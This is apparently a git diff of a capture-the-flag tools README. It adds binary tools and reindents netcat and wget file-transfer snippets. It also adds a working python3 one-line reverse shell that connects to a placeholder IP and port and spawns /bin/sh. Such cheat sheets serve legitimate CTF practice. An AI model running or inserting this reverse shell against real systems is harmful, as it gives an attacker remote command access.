@@ -6,7 +6,7 @@ Collection of useful tools for CTFs.
   - [Web](#web)
   - [Crypto](#crypto)
   - [Steganography](#stego)
-  - [Binary](#binary)
+  - [Binary/Reverse](#binary)
   - [Other](#other)
   - [Useful](#useful)
   - [to update]
@@ -59,7 +59,7 @@ Example usage: steghide <command> <file>
 
 ---
 
-## Binary
+## Binary/Reverse
 
 * checksec
 * strings
@@ -68,6 +68,8 @@ Example usage: steghide <command> <file>
 * apktool
 * frida
 * gdb / gdb-peda
+* hexdump (-C option very useful)
+* objdump
 
 ---
 
@@ -92,23 +94,27 @@ Example usage: searchsploit OpenSSH 7.2p2
 
 * sending a file using nc:
 ```
-client side : nc -lvp <port> > <file>
-server side : nc <ip_server> <port_server> < <file>
+    client side : nc -lvp <port> > <file>
+    server side : nc <ip_server> <port_server> < <file>
 ```
 * sending a file using nc + wget:
 ```
-client side : nc -lvp <port> < <file>
-server side : wget <ip_server>:<port_server>/<file>
+    client side : nc -lvp <port> < <file>
+    server side : wget <ip_server>:<port_server>/<file>
 
 !! [NOTE: protocol will continue after transmission of file (maybe because client side does not receive CRLF sequence). So after a while, just press CTRL+c et voit-là] 
 ```
 * to convert a python script from v.2 to v.3
 ```
-python3 -m lib2to3 <script>.py -w
+    python3 -m lib2to3 <script>.py -w
 ```
 * connect to server pop3 (port 110) using telnet:
 ```
     telnet <ip> 110
+```
+* reverse shell with one line only, using python3:
+```
+    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 
